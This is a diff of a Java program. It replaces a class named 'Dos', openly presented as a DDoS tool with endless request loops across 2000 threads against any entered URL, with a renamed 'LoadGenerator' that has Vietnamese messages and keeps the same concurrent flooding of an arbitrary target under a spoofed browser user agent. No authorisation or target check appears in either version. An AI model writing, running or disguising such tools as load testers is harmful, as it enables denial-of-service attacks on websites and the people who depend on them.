@@ -1,200 +1,150 @@
-import java.io.*;
-import java.net.*;
+import java.io.IOException;
+import java.net.URI;
+import java.net.http.HttpClient;
+import java.net.http.HttpRequest;
+import java.net.http.HttpResponse;
+import java.time.Duration;
 import java.util.Scanner;
-import java.util.ArrayList;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
 
-import javax.net.ssl.HttpsURLConnection;
+public class LoadGenerator {
 
+    private static final String USER_AGENT = "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1";
+    private static final Duration TIMEOUT = Duration.ofSeconds(10); // Thời gian chờ kết nối
 
-public class Dos implements Runnable {
+    private final HttpClient httpClient;
+    private final String targetUrl;
 
-
-
-    private final String USER_AGENT =   "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1";
-
-    private static int amount = 0;
-    private static String url = "";
-    int seq;
-    int type;
-
-    public Dos(int seq, int type) {
-        this.seq = seq;
-        this.type = type;
+    public LoadGenerator(String targetUrl) {
+        this.targetUrl = targetUrl;
+        // Xây dựng một phiên bản HttpClient dùng chung để đạt hiệu quả
+        this.httpClient = HttpClient.newBuilder()
+                .version(HttpClient.Version.HTTP_1_1) // Hoặc HTTP_2 nếu ưu tiên và được hỗ trợ
+                .followRedirects(HttpClient.Redirect.NORMAL)
+                .connectTimeout(TIMEOUT)
+                .build();
     }
 
-    public void run() {
-        try {
-            while (true) {
-                switch (this.type) {
-                    case 1:
-                        postAttack(Dos.url);
-                        break;
-                    case 2:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 3:
-                        getAttack(Dos.url);
-                        break;
-                    case 4:
-                        sslGetAttack(Dos.url);
-                        break;
-
-                }
-            }
-        } catch (Exception e) {
-
-        }
-    }
-
-
-    public static void main(String[] args) throws Exception {
-        String url = "";
-        int attakingAmoun = 0;
-        Dos dos = new Dos(0, 0);
+    public static void main(String[] args) {
         Scanner in = new Scanner(System.in);
-        System.out.print("Enter Url: ");
-        url = in.nextLine();
-        System.out.println("\n");
-        System.out.println("Starting Attack to url: " + url);
 
-        String[] SUrl = url.split("://");
+        System.out.print("Nhập URL: ");
+        String url = in.nextLine();
 
-        System.out.println("Checking connection to Site");
-        if (SUrl[0] == "http" || SUrl[0].equals("http")) {
-            dos.checkConnection(url);
-        } else {
-            dos.sslCheckConnection(url);
+        if (url.isEmpty()) {
+            System.err.println("URL không được để trống. Đang thoát.");
+            in.close();
+            return;
         }
 
-        System.out.println("Setting DDoS By: Shadow Tak");
-
-        System.out.print("Thread: ");
-        String amount = in.nextLine();
-
-        if (amount == null || amount.equals(null) || amount.equals("")) {
-            Dos.amount = 2000;
-        } else {
-            Dos.amount = Integer.parseInt(amount);
-        }
-
-        System.out.print("method: ");
-        String option = in.nextLine();
-        int ioption = 1;
-        if (option == "get" || option == "GET") {
-            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
-                ioption = 3;
-            } else {
-                ioption = 4;
-            }
-        } else {
-            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
-                ioption = 1;
-            } else {
-                ioption = 2;
-            }
-        }
-
-        Thread.sleep(2000);
-
-
-        System.out.println("Starting Attack");
-        ArrayList<Thread> threads = new ArrayList<Thread>();
-        for (int i = 0; i < Dos.amount; i++) {
-            Thread t = new Thread(new Dos(i, ioption));
-            t.start();
-            threads.add(t);
-        }
-
-        for (int i = 0; i < threads.size(); i++) {
-            Thread t = threads.get(i);
+        System.out.print("Nhập số lượng yêu cầu đồng thời (luồng) [mặc định: 2000]: ");
+        String amountInput = in.nextLine();
+        int concurrentRequests = 2000; // Giá trị mặc định
+        if (!amountInput.isEmpty()) {
             try {
-                t.join();
-            } catch (Exception e) {
-
+                concurrentRequests = Integer.parseInt(amountInput);
+                if (concurrentRequests <= 0) {
+                    System.err.println("Số lượng yêu cầu đồng thời phải là số dương. Đang sử dụng mặc định (2000).");
+                    concurrentRequests = 2000;
+                }
+            } catch (NumberFormatException e) {
+                System.err.println("Định dạng số không hợp lệ cho luồng. Đang sử dụng mặc định (2000).");
             }
         }
-        System.out.println("Main Thread ended");
-    }
 
-    private void checkConnection(String url) throws Exception {
-        System.out.println("Checking Connection");
-        URL obj = new URL(url);
-        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
-        con.setRequestMethod("GET");
-        con.setRequestProperty("User-Agent", USER_AGENT);
-
-        int responseCode = con.getResponseCode();
-        if (responseCode == 200) {
-            System.out.println("Connected to website");
+        System.out.print("Nhập phương thức (GET/POST) [mặc định: POST]: ");
+        String method = in.nextLine().toUpperCase();
+        if (!method.equals("GET") && !method.equals("POST")) {
+            System.err.println("Phương thức không hợp lệ. Đang sử dụng mặc định (POST).");
+            method = "POST";
         }
-        Dos.url = url;
-    }
 
-    private void sslCheckConnection(String url) throws Exception {
-        System.out.println("Checking Connection (ssl)");
-        URL obj = new URL(url);
-        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
-        con.setRequestMethod("GET");
-        con.setRequestProperty("User-Agent", USER_AGENT);
+        System.out.println("\nĐang bắt đầu tạo tải cho URL: " + url);
+        System.out.println("Số lượng yêu cầu đồng thời: " + concurrentRequests);
+        System.out.println("Phương thức: " + method);
 
-        int responseCode = con.getResponseCode();
-        if (responseCode == 200) {
-            System.out.println("Connected to website");
+        LoadGenerator generator = new LoadGenerator(url);
+
+        // Kiểm tra kết nối đơn giản
+        try {
+            System.out.println("Đang thực hiện kiểm tra kết nối ban đầu...");
+            HttpResponse<String> response = generator.httpClient.send(
+                    HttpRequest.newBuilder()
+                            .uri(URI.create(url))
+                            .header("User-Agent", USER_AGENT)
+                            .GET()
+                            .timeout(TIMEOUT)
+                            .build(),
+                    HttpResponse.BodyHandlers.ofString()
+            );
+            System.out.println("Trạng thái kết nối ban đầu: " + response.statusCode());
+        } catch (IOException | InterruptedException e) {
+            System.err.println("Không thể kết nối đến URL: " + e.getMessage());
+            in.close();
+            return;
         }
-        Dos.url = url;
+
+        ExecutorService executor = Executors.newFixedThreadPool(concurrentRequests);
+
+        System.out.println("Đang bắt đầu tạo tải...");
+        for (int i = 0; i < concurrentRequests; i++) {
+            final int requestSeq = i; // Để sử dụng trong lambda
+            final String finalMethod = method; // Để sử dụng trong lambda
+            executor.submit(() -> {
+                try {
+                    if (finalMethod.equals("POST")) {
+                        generator.sendPostRequest(requestSeq);
+                    } else {
+                        generator.sendGetRequest(requestSeq);
+                    }
+                } catch (IOException | InterruptedException e) {
+                    System.err.println("Yêu cầu " + requestSeq + " thất bại: " + e.getMessage());
+                }
+            });
+        }
+
+        executor.shutdown(); // Bắt đầu tắt một cách có trật tự
+        try {
+            // Chờ tất cả các tác vụ hoàn thành hoặc hết thời gian chờ sau 5 phút
+            if (!executor.awaitTermination(5, TimeUnit.MINUTES)) {
+                System.out.println("Một số tác vụ không hoàn thành trong thời gian chờ. Đang buộc tắt.");
+                executor.shutdownNow(); // Buộc tắt nếu không phải tất cả tác vụ đã hoàn thành
+            }
+        } catch (InterruptedException e) {
+            System.err.println("Tạo tải bị gián đoạn trong quá trình tắt.");
+            executor.shutdownNow(); // Hủy các tác vụ đang thực thi
+            Thread.currentThread().interrupt(); // Khôi phục trạng thái ngắt
+        }
+
+        System.out.println("Tạo tải đã hoàn tất.");
+        in.close();
     }
 
-    private void postAttack(String url) throws Exception {
-        URL obj = new URL(url);
-        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
-        con.setRequestMethod("POST");
-        con.setRequestProperty("User-Agent", USER_AGENT);
-        con.setRequestProperty("Accept-Language", "en-US,en;");
-        String urlParameters = "out of memory";
+    private void sendPostRequest(int seq) throws IOException, InterruptedException {
+        String requestBody = "load_data=" + System.currentTimeMillis(); // Nội dung động
+        HttpRequest request = HttpRequest.newBuilder()
+                .uri(URI.create(targetUrl))
+                .header("User-Agent", USER_AGENT)
+                .header("Content-Type", "application/x-www-form-urlencoded")
+                .POST(HttpRequest.BodyPublishers.ofString(requestBody))
+                .timeout(TIMEOUT)
+                .build();
 
-        con.setDoOutput(true);
-        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
-        wr.writeBytes(urlParameters);
-        wr.flush();
-        wr.close();
-        int responseCode = con.getResponseCode();
-        System.out.println("POST attack done!: " + responseCode + "Thread: " + this.seq);
+        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
+        System.out.println("Yêu cầu POST " + seq + " hoàn thành! Trạng thái: " + response.statusCode());
     }
 
-    private void getAttack(String url) throws Exception {
-        URL obj = new URL(url);
-        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
-        con.setRequestMethod("GET");
-        con.setRequestProperty("User-Agent", USER_AGENT);
+    private void sendGetRequest(int seq) throws IOException, InterruptedException {
+        HttpRequest request = HttpRequest.newBuilder()
+                .uri(URI.create(targetUrl))
+                .header("User-Agent", USER_AGENT)
+                .GET()
+                .timeout(TIMEOUT)
+                .build();
 
-        int responseCode = con.getResponseCode();
-        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
-    }
-
-    private void sslPostAttack(String url) throws Exception {
-        URL obj = new URL(url);
-        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
-        con.setRequestMethod("GET");
-        con.setRequestProperty("User-Agent", USER_AGENT);
-        con.setRequestProperty("Accept-Language", "en-US,en;");
-        String urlParameters = "out of memory";
-
-        con.setDoOutput(true);
-        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
-        wr.writeBytes(urlParameters);
-        wr.flush();
-        wr.close();
-        int responseCode = con.getResponseCode();
-        System.out.println("GET attack done!:" + responseCode + "Thread: " + this.seq);
-    }
-
-    private void sslGetAttack(String url) throws Exception {
-        URL obj = new URL(url);
-        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
-        con.setRequestMethod("GET");
-        con.setRequestProperty("User-Agent", USER_AGENT);
-
-        int responseCode = con.getResponseCode();
-        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
+        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
+        System.out.println("Yêu cầu GET " + seq + " hoàn thành! Trạng thái: " + response.statusCode());
     }
 }
